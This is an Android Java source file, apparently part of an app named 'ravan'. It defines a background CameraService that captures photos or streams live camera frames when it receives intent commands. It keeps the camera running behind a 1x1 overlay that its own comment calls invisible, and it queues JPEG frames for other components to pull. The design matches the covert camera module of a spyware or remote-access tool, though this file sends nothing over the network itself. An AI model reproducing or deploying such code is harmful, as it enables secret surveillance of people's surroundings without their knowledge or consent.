package com.security.ravan;

import android.Manifest;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.content.pm.ServiceInfo;
import android.graphics.ImageFormat;
import android.graphics.PixelFormat;
import android.graphics.Rect;
import android.graphics.SurfaceTexture;
import android.graphics.YuvImage;
import android.hardware.camera2.CameraAccessException;
import android.hardware.camera2.CameraCaptureSession;
import android.hardware.camera2.CameraCharacteristics;
import android.hardware.camera2.CameraDevice;
import android.hardware.camera2.CameraManager;
import android.hardware.camera2.CaptureRequest;
import android.hardware.camera2.TotalCaptureResult;
import android.media.Image;
import android.media.ImageReader;
import android.os.Build;
import android.os.Handler;
import android.os.HandlerThread;
import android.os.IBinder;
import android.util.Base64;
import android.util.Log;
import android.util.Size;
import android.view.Gravity;
import android.view.Surface;
import android.view.SurfaceHolder;
import android.view.SurfaceView;
import android.view.WindowManager;

import androidx.annotation.NonNull;
import androidx.annotation.Nullable;
import androidx.core.app.NotificationCompat;

import java.io.ByteArrayOutputStream;
import java.nio.ByteBuffer;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Collections;
import java.util.List;
import java.util.concurrent.ArrayBlockingQueue;
import java.util.concurrent.BlockingQueue;
import java.util.concurrent.CountDownLatch;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.atomic.AtomicBoolean;

public class CameraService extends Service {
    private static final String TAG = "CameraService";
    private static final String CHANNEL_ID = "CameraServiceChannel";
    private static final int NOTIFICATION_ID = 2002;

    // Camera components
    private CameraManager cameraManager;
    private CameraDevice cameraDevice;
    private CameraCaptureSession captureSession;
    private ImageReader imageReader;
    private Handler backgroundHandler;
    private HandlerThread backgroundThread;

    // Overlay for background camera
    private WindowManager windowManager;
    private SurfaceView surfaceView;
    private boolean surfaceReady = false;
    private CountDownLatch surfaceLatch;

    // Live streaming
    private static volatile boolean isStreaming = false;
    private static volatile String currentCameraId = "0";
    private static volatile int streamWidth = 640;
    private static volatile int streamHeight = 480;
    private static volatile int streamQuality = 50;
    private static final BlockingQueue<byte[]> frameQueue = new ArrayBlockingQueue<>(5);

    // Photo capture
    private static volatile byte[] lastCapturedPhoto = null;
    private static volatile String lastCaptureError = null;
    private static volatile boolean captureInProgress = false;
    private static CountDownLatch captureLatch;

    // Singleton instance
    private static CameraService instance;

    public static CameraService getInstance() {
        return instance;
    }

    @Override
    public void onCreate() {
        super.onCreate();
        instance = this;
        cameraManager = (CameraManager) getSystemService(Context.CAMERA_SERVICE);
        createNotificationChannel();
        startBackgroundThread();
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        if (intent != null) {
            String action = intent.getAction();
            if ("START_STREAM".equals(action)) {
                String camId = intent.getStringExtra("cameraId");
                int width = intent.getIntExtra("width", 640);
                int height = intent.getIntExtra("height", 480);
                int quality = intent.getIntExtra("quality", 50);
                startStreaming(camId, width, height, quality);
            } else if ("STOP_STREAM".equals(action)) {
                stopStreaming();
            } else if ("CAPTURE_PHOTO".equals(action)) {
                String camId = intent.getStringExtra("cameraId");
                capturePhotoBackground(camId);
            } else if ("STOP".equals(action)) {
                stopStreaming();
                stopForeground(true);
                stopSelf();
            }
        }

        // Start foreground service
        startForeground();
        return START_STICKY;
    }

    private void startForeground() {
        Intent notificationIntent = new Intent(this, MainActivity.class);
        PendingIntent pendingIntent = PendingIntent.getActivity(this, 0, notificationIntent,
                PendingIntent.FLAG_IMMUTABLE);

        Notification notification = new NotificationCompat.Builder(this, CHANNEL_ID)
                .setContentTitle("Camera Service")
                .setContentText("Camera service is running")
                .setSmallIcon(android.R.drawable.ic_menu_camera)
                .setContentIntent(pendingIntent)
                .setOngoing(true)
                .setPriority(NotificationCompat.PRIORITY_LOW)
                .build();

        if (Build.VERSION.SDK_INT >= 34) {
            startForeground(NOTIFICATION_ID, notification, ServiceInfo.FOREGROUND_SERVICE_TYPE_CAMERA);
        } else if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            startForeground(NOTIFICATION_ID, notification, ServiceInfo.FOREGROUND_SERVICE_TYPE_MEDIA_PROJECTION);
        } else {
            startForeground(NOTIFICATION_ID, notification);
        }
    }

    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(
                    CHANNEL_ID,
                    "Camera Service",
                    NotificationManager.IMPORTANCE_LOW);
            channel.setDescription("Camera capture service");
            NotificationManager manager = getSystemService(NotificationManager.class);
            if (manager != null) {
                manager.createNotificationChannel(channel);
            }
        }
    }

    private void startBackgroundThread() {
        if (backgroundThread == null) {
            backgroundThread = new HandlerThread("CameraBackground");
            backgroundThread.start();
            backgroundHandler = new Handler(backgroundThread.getLooper());
        }
    }

    private void stopBackgroundThread() {
        if (backgroundThread != null) {
            backgroundThread.quitSafely();
            try {
                backgroundThread.join();
                backgroundThread = null;
                backgroundHandler = null;
            } catch (InterruptedException e) {
                Log.e(TAG, "Error stopping background thread", e);
            }
        }
    }

    // ============ OVERLAY FOR BACKGROUND CAMERA ============

    private void createOverlay() {
        if (windowManager != null && surfaceView != null) {
            return; // Already created
        }

        try {
            windowManager = (WindowManager) getSystemService(Context.WINDOW_SERVICE);
            surfaceView = new SurfaceView(getApplicationContext());

            int layoutType;
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                layoutType = WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY;
            } else {
                layoutType = WindowManager.LayoutParams.TYPE_SYSTEM_OVERLAY;
            }

            WindowManager.LayoutParams params = new WindowManager.LayoutParams(
                    1, 1, // Minimal size - invisible
                    layoutType,
                    WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE |
                            WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE |
                            WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL,
                    PixelFormat.TRANSLUCENT);
            params.gravity = Gravity.TOP | Gravity.START;

            surfaceLatch = new CountDownLatch(1);

            surfaceView.getHolder().addCallback(new SurfaceHolder.Callback() {
                @Override
                public void surfaceCreated(@NonNull SurfaceHolder holder) {
                    surfaceReady = true;
                    surfaceLatch.countDown();
                    Log.d(TAG, "Surface created");
                }

                @Override
                public void surfaceChanged(@NonNull SurfaceHolder holder, int format, int width, int height) {
                }

                @Override
                public void surfaceDestroyed(@NonNull SurfaceHolder holder) {
                    surfaceReady = false;
                }
            });

            // Add view on main thread
            new Handler(getMainLooper()).post(() -> {
                try {
                    windowManager.addView(surfaceView, params);
                } catch (Exception e) {
                    Log.e(TAG, "Error adding surface view", e);
                    surfaceLatch.countDown();
                }
            });

        } catch (Exception e) {
            Log.e(TAG, "Error creating overlay", e);
        }
    }

    private void removeOverlay() {
        if (windowManager != null && surfaceView != null) {
            try {
                new Handler(getMainLooper()).post(() -> {
                    try {
                        windowManager.removeView(surfaceView);
                    } catch (Exception e) {
                        Log.e(TAG, "Error removing view", e);
                    }
                    surfaceView = null;
                    windowManager = null;
                    surfaceReady = false;
                });
            } catch (Exception e) {
                Log.e(TAG, "Error removing overlay", e);
            }
        }
    }

    // ============ PHOTO CAPTURE ============

    public void capturePhotoBackground(String cameraId) {
        if (cameraId == null)
            cameraId = "0";

        captureInProgress = true;
        lastCapturedPhoto = null;
        lastCaptureError = null;
        captureLatch = new CountDownLatch(1);

        final String camId = cameraId;

        backgroundHandler.post(() -> {
            try {
                createOverlay();

                // Wait for surface
                if (surfaceLatch != null) {
                    surfaceLatch.await(5, TimeUnit.SECONDS);
                }

                if (!surfaceReady) {
                    lastCaptureError = "Surface not ready";
                    captureLatch.countDown();
                    return;
                }

                capturePhotoInternal(camId);

            } catch (Exception e) {
                lastCaptureError = "Error: " + e.getMessage();
                captureLatch.countDown();
            }
        });
    }

    private void capturePhotoInternal(String cameraId) {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            if (checkSelfPermission(Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED) {
                lastCaptureError = "Camera permission not granted";
                captureLatch.countDown();
                return;
            }
        }

        try {
            CameraCharacteristics characteristics = cameraManager.getCameraCharacteristics(cameraId);
            Size[] jpegSizes = characteristics.get(
                    CameraCharacteristics.SCALER_STREAM_CONFIGURATION_MAP)
                    .getOutputSizes(ImageFormat.JPEG);

            Size size = chooseBestSize(jpegSizes, 1280, 720);
            int width = size.getWidth();
            int height = size.getHeight();

            imageReader = ImageReader.newInstance(width, height, ImageFormat.JPEG, 1);
            imageReader.setOnImageAvailableListener(reader -> {
                Image image = null;
                try {
                    image = reader.acquireLatestImage();
                    if (image != null) {
                        ByteBuffer buffer = image.getPlanes()[0].getBuffer();
                        lastCapturedPhoto = new byte[buffer.remaining()];
                        buffer.get(lastCapturedPhoto);
                    }
                } catch (Exception e) {
                    lastCaptureError = "Error reading image: " + e.getMessage();
                } finally {
                    if (image != null)
                        image.close();
                    captureInProgress = false;
                    captureLatch.countDown();
                    closeCamera();
                }
            }, backgroundHandler);

            cameraManager.openCamera(cameraId, new CameraDevice.StateCallback() {
                @Override
                public void onOpened(@NonNull CameraDevice camera) {
                    cameraDevice = camera;
                    createPhotoCaptureSession();
                }

                @Override
                public void onDisconnected(@NonNull CameraDevice camera) {
                    camera.close();
                    cameraDevice = null;
                    lastCaptureError = "Camera disconnected";
                    captureLatch.countDown();
                }

                @Override
                public void onError(@NonNull CameraDevice camera, int error) {
                    camera.close();
                    cameraDevice = null;
                    lastCaptureError = "Camera error: " + error;
                    captureLatch.countDown();
                }
            }, backgroundHandler);

        } catch (CameraAccessException e) {
            lastCaptureError = "Camera access error: " + e.getMessage();
            captureLatch.countDown();
        } catch (SecurityException e) {
            lastCaptureError = "Permission denied";
            captureLatch.countDown();
        }
    }

    private void createPhotoCaptureSession() {
        try {
            Surface surface = imageReader.getSurface();

            cameraDevice.createCaptureSession(Arrays.asList(surface),
                    new CameraCaptureSession.StateCallback() {
                        @Override
                        public void onConfigured(@NonNull CameraCaptureSession session) {
                            captureSession = session;
                            takePhoto();
                        }

                        @Override
                        public void onConfigureFailed(@NonNull CameraCaptureSession session) {
                            lastCaptureError = "Session configuration failed";
                            captureLatch.countDown();
                        }
                    }, backgroundHandler);
        } catch (CameraAccessException e) {
            lastCaptureError = "Session error: " + e.getMessage();
            captureLatch.countDown();
        }
    }

    private void takePhoto() {
        try {
            CaptureRequest.Builder builder = cameraDevice.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE);
            builder.addTarget(imageReader.getSurface());
            builder.set(CaptureRequest.CONTROL_AF_MODE, CaptureRequest.CONTROL_AF_MODE_CONTINUOUS_PICTURE);
            builder.set(CaptureRequest.CONTROL_AE_MODE, CaptureRequest.CONTROL_AE_MODE_ON);

            captureSession.capture(builder.build(), new CameraCaptureSession.CaptureCallback() {
                @Override
                public void onCaptureCompleted(@NonNull CameraCaptureSession session,
                        @NonNull CaptureRequest request, @NonNull TotalCaptureResult result) {
                    // Image available in ImageReader callback
                }
            }, backgroundHandler);
        } catch (CameraAccessException e) {
            lastCaptureError = "Capture error: " + e.getMessage();
            captureLatch.countDown();
        }
    }

    // ============ LIVE STREAMING ============

    public void startStreaming(String cameraId, int width, int height, int quality) {
        if (isStreaming) {
            stopStreaming();
        }

        currentCameraId = cameraId != null ? cameraId : "0";
        streamWidth = width > 0 ? width : 640;
        streamHeight = height > 0 ? height : 480;
        streamQuality = quality > 0 ? quality : 50;

        backgroundHandler.post(() -> {
            try {
                createOverlay();

                // Wait for surface
                if (surfaceLatch != null) {
                    surfaceLatch.await(5, TimeUnit.SECONDS);
                }

                if (!surfaceReady) {
                    Log.e(TAG, "Surface not ready for streaming");
                    return;
                }

                startStreamingInternal();

            } catch (Exception e) {
                Log.e(TAG, "Error starting stream", e);
            }
        });
    }

    private void startStreamingInternal() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            if (checkSelfPermission(Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED) {
                Log.e(TAG, "Camera permission not granted");
                return;
            }
        }

        try {
            frameQueue.clear();

            CameraCharacteristics characteristics = cameraManager.getCameraCharacteristics(currentCameraId);
            Size[] sizes = characteristics.get(
                    CameraCharacteristics.SCALER_STREAM_CONFIGURATION_MAP)
                    .getOutputSizes(ImageFormat.YUV_420_888);

            Size size = chooseBestSize(sizes, streamWidth, streamHeight);
            streamWidth = size.getWidth();
            streamHeight = size.getHeight();

            imageReader = ImageReader.newInstance(streamWidth, streamHeight, ImageFormat.YUV_420_888, 2);
            imageReader.setOnImageAvailableListener(reader -> {
                Image image = null;
                try {
                    image = reader.acquireLatestImage();
                    if (image != null && isStreaming) {
                        byte[] jpegData = yuv420ToJpeg(image, streamQuality);
                        if (jpegData != null) {
                            // Clear old frames if queue is full
                            while (!frameQueue.offer(jpegData)) {
                                frameQueue.poll();
                            }
                        }
                    }
                } catch (Exception e) {
                    Log.e(TAG, "Error processing frame", e);
                } finally {
                    if (image != null)
                        image.close();
                }
            }, backgroundHandler);

            cameraManager.openCamera(currentCameraId, new CameraDevice.StateCallback() {
                @Override
                public void onOpened(@NonNull CameraDevice camera) {
                    cameraDevice = camera;
                    createStreamingSession();
                }

                @Override
                public void onDisconnected(@NonNull CameraDevice camera) {
                    camera.close();
                    cameraDevice = null;
                    isStreaming = false;
                }

                @Override
                public void onError(@NonNull CameraDevice camera, int error) {
                    camera.close();
                    cameraDevice = null;
                    isStreaming = false;
                }
            }, backgroundHandler);

        } catch (Exception e) {
            Log.e(TAG, "Error starting stream", e);
            isStreaming = false;
        }
    }

    private void createStreamingSession() {
        try {
            Surface surface = imageReader.getSurface();

            cameraDevice.createCaptureSession(Arrays.asList(surface),
                    new CameraCaptureSession.StateCallback() {
                        @Override
                        public void onConfigured(@NonNull CameraCaptureSession session) {
                            captureSession = session;
                            startPreview();
                        }

                        @Override
                        public void onConfigureFailed(@NonNull CameraCaptureSession session) {
                            Log.e(TAG, "Streaming session configuration failed");
                            isStreaming = false;
                        }
                    }, backgroundHandler);
        } catch (CameraAccessException e) {
            Log.e(TAG, "Error creating streaming session", e);
            isStreaming = false;
        }
    }

    private void startPreview() {
        try {
            CaptureRequest.Builder builder = cameraDevice.createCaptureRequest(CameraDevice.TEMPLATE_PREVIEW);
            builder.addTarget(imageReader.getSurface());
            builder.set(CaptureRequest.CONTROL_AF_MODE, CaptureRequest.CONTROL_AF_MODE_CONTINUOUS_VIDEO);
            builder.set(CaptureRequest.CONTROL_AE_MODE, CaptureRequest.CONTROL_AE_MODE_ON);

            captureSession.setRepeatingRequest(builder.build(), null, backgroundHandler);
            isStreaming = true;
            Log.d(TAG, "Streaming started");
        } catch (CameraAccessException e) {
            Log.e(TAG, "Error starting preview", e);
            isStreaming = false;
        }
    }

    public void stopStreaming() {
        isStreaming = false;
        closeCamera();
        frameQueue.clear();
        Log.d(TAG, "Streaming stopped");
    }

    private byte[] yuv420ToJpeg(Image image, int quality) {
        try {
            int width = image.getWidth();
            int height = image.getHeight();

            Image.Plane[] planes = image.getPlanes();
            ByteBuffer yBuffer = planes[0].getBuffer();
            ByteBuffer uBuffer = planes[1].getBuffer();
            ByteBuffer vBuffer = planes[2].getBuffer();

            int ySize = yBuffer.remaining();
            int uSize = uBuffer.remaining();
            int vSize = vBuffer.remaining();

            byte[] nv21 = new byte[ySize + uSize + vSize];

            yBuffer.get(nv21, 0, ySize);
            vBuffer.get(nv21, ySize, vSize);
            uBuffer.get(nv21, ySize + vSize, uSize);

            YuvImage yuvImage = new YuvImage(nv21, ImageFormat.NV21, width, height, null);
            ByteArrayOutputStream out = new ByteArrayOutputStream();
            yuvImage.compressToJpeg(new Rect(0, 0, width, height), quality, out);

            return out.toByteArray();
        } catch (Exception e) {
            Log.e(TAG, "Error converting YUV to JPEG", e);
            return null;
        }
    }

    // ============ UTILITY METHODS ============

    private Size chooseBestSize(Size[] sizes, int targetWidth, int targetHeight) {
        if (sizes == null || sizes.length == 0) {
            return new Size(640, 480);
        }

        List<Size> sizeList = Arrays.asList(sizes);
        Collections.sort(sizeList, (a, b) -> {
            int areaA = a.getWidth() * a.getHeight();
            int areaB = b.getWidth() * b.getHeight();
            return Integer.compare(areaA, areaB);
        });

        int targetArea = targetWidth * targetHeight;
        for (Size size : sizeList) {
            int area = size.getWidth() * size.getHeight();
            if (area >= targetArea * 0.5 && area <= targetArea * 2) {
                return size;
            }
        }

        // Return closest to target
        for (Size size : sizeList) {
            if (size.getWidth() >= 320 && size.getWidth() <= 1280) {
                return size;
            }
        }

        return sizeList.get(sizeList.size() / 2);
    }

    private void closeCamera() {
        if (captureSession != null) {
            try {
                captureSession.close();
            } catch (Exception e) {
            }
            captureSession = null;
        }
        if (cameraDevice != null) {
            cameraDevice.close();
            cameraDevice = null;
        }
        if (imageReader != null) {
            imageReader.close();
            imageReader = null;
        }
    }

    public List<CameraInfo> getAvailableCameras() {
        List<CameraInfo> cameras = new ArrayList<>();
        try {
            String[] cameraIds = cameraManager.getCameraIdList();
            for (String cameraId : cameraIds) {
                CameraCharacteristics characteristics = cameraManager.getCameraCharacteristics(cameraId);
                Integer facing = characteristics.get(CameraCharacteristics.LENS_FACING);

                String facingStr = "Unknown";
                if (facing != null) {
                    if (facing == CameraCharacteristics.LENS_FACING_FRONT) {
                        facingStr = "Front";
                    } else if (facing == CameraCharacteristics.LENS_FACING_BACK) {
                        facingStr = "Back";
                    }
                }

                Size[] sizes = characteristics.get(
                        CameraCharacteristics.SCALER_STREAM_CONFIGURATION_MAP)
                        .getOutputSizes(ImageFormat.JPEG);

                int width = 640, height = 480;
                if (sizes != null && sizes.length > 0) {
                    Size size = chooseBestSize(sizes, 1280, 720);
                    width = size.getWidth();
                    height = size.getHeight();
                }

                cameras.add(new CameraInfo(cameraId, facingStr, width, height));
            }
        } catch (CameraAccessException e) {
            Log.e(TAG, "Error getting camera list", e);
        }
        return cameras;
    }

    // ============ STATIC ACCESSORS ============

    public static boolean isCurrentlyStreaming() {
        return isStreaming;
    }

    public static byte[] getNextFrame() {
        return frameQueue.poll();
    }

    public static byte[] getNextFrame(long timeoutMs) {
        try {
            return frameQueue.poll(timeoutMs, TimeUnit.MILLISECONDS);
        } catch (InterruptedException e) {
            return null;
        }
    }

    public static byte[] waitForPhoto(long timeoutMs) {
        if (captureLatch != null) {
            try {
                captureLatch.await(timeoutMs, TimeUnit.MILLISECONDS);
            } catch (InterruptedException e) {
            }
        }
        return lastCapturedPhoto;
    }

    public static String getLastCaptureError() {
        return lastCaptureError;
    }

    public static boolean isCaptureInProgress() {
        return captureInProgress;
    }

    public static String getCurrentCameraId() {
        return currentCameraId;
    }

    public static int getStreamWidth() {
        return streamWidth;
    }

    public static int getStreamHeight() {
        return streamHeight;
    }

    // ============ CAMERA INFO CLASS ============

    public static class CameraInfo {
        public String id;
        public String facing;
        public int width;
        public int height;

        public CameraInfo(String id, String facing, int width, int height) {
            this.id = id;
            this.facing = facing;
            this.width = width;
            this.height = height;
        }
    }

    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        isStreaming = false;
        closeCamera();
        removeOverlay();
        stopBackgroundThread();
        instance = null;
    }
}
